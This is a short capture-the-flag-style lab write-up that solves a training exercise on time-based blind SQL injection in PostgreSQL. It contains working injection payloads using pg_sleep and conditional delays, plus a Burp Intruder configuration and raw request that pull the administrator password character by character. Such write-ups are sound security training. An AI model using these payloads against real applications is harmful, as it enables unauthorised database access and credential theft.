# Lab: Blind SQL injection with time delays and information retrieval
## Description

1) Find the Blind SQLi. `'%3b%20SELECT%20pg_sleep(10)%20--` (PostgreSQL)

2) Use conditional time delays to extract data. First, we created a proof of concept:

```sql
';SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE pg_sleep(0) END--  (1 sec delay)
```
```sql
';SELECT CASE WHEN (1=0) THEN pg_sleep(1) ELSE pg_sleep(0) END--  (no delay)
```
Next, lets combine the SELECT query to extract the password with the condition above

```
username = 'administrator' AND SUBSTRING(Password, 1, 1) = 'm'
```

## Solution

Use Intruder in Cluster Bomb mode. Configure resource pool to use max. 1 concurrent requst.

Configure Payload sets:
1) Numbers 1-20 with 1 step
2) Simple list with chars a-z0-9

Target request
```yaml
GET /filter?category=Gifts HTTP/1.1
Host: ac5c1fcc1e69f5dec00919e100b200fb.web-security-academy.net
Cookie: TrackingId=tGVgOpzWs24rJiHF'%3bSELECT+CASE+WHEN+(SELECT+username+%3d+'administrator'+AND+SUBSTRING(password,§NUMBERS§,1)+%3d+'§SIMPLELIST§')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--; session=KWdVkFOvwYIopzdj1TSBLQHZC9HLwcQH
```